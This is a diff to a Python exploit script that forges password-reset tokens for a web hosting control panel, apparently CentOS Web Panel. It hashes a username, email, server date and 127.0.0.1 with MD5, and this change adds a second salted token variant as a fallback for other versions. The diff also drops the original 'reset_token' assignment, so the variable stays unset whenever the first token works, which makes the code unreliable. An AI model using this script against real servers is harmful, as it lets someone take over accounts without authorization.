@@ -129,22 +129,35 @@ if __name__ == '__main__':
         exit()
 
     print(f'  [-] Got Date {date_string} from response')
-    # format the token
-    token_string = f'{args.username}||{args.email_address}||{date_string}||127.0.0.1'
-    #token_string = f'{args.username}||{args.email_address}||{date_string}||127.0.0.1||CWP2022'
+
+    # Generate both token types for multiple versions
+    token_string_one = f'{args.username}||{args.email_address}||{date_string}||127.0.0.1'
+    token_string_two = f'{args.username}||{args.email_address}||{date_string}||127.0.0.1||CWP2022'
 
     # hash the token with md5
 
     print(f'  [-] Generating Reset Token with username, email and reset token')
-    reset_token = hashlib.md5(token_string.encode('utf-8')).hexdigest()
-    print(f'  [*] Token: {reset_token}')
+    reset_token_one = hashlib.md5(token_string_one.encode('utf-8')).hexdigest()
+    reset_token_two = hashlib.md5(token_string_two.encode('utf-8')).hexdigest()
+    print(f'  [*] Token: {reset_token_one}')
 
     print('[+] Confirming Reset Token')
-    confirm_url = f'{base_url}/login/?acc=reconfir&idsession={reset_token}'
+    confirm_url = f'{base_url}/login/?acc=reconfir&idsession={reset_token_one}'
     confirm_response = session.get(confirm_url, verify=False)
 
+    if b'invalid or expired link' in confirm_response.content:
+        print('[!] Invalid response from confirmation request')
+        print('[+] Testing 2nd token')
+        print(f'  [*] Token: {reset_token_two}')
+
+        confirm_url = f'{base_url}/login/?acc=reconfir&idsession={reset_token_two}'
+        confirm_response = session.get(confirm_url, verify=False)
+
+        # Make sure we send the correct token on reset
+        reset_token = reset_token_two
+
     if b'Retype your password' not in confirm_response.content:
-        print('[!] Invalid Reponse from Confirmation request')
+        print('[!] Invalid Reponse from Confirmation request; aborting')
         exit()
 
 
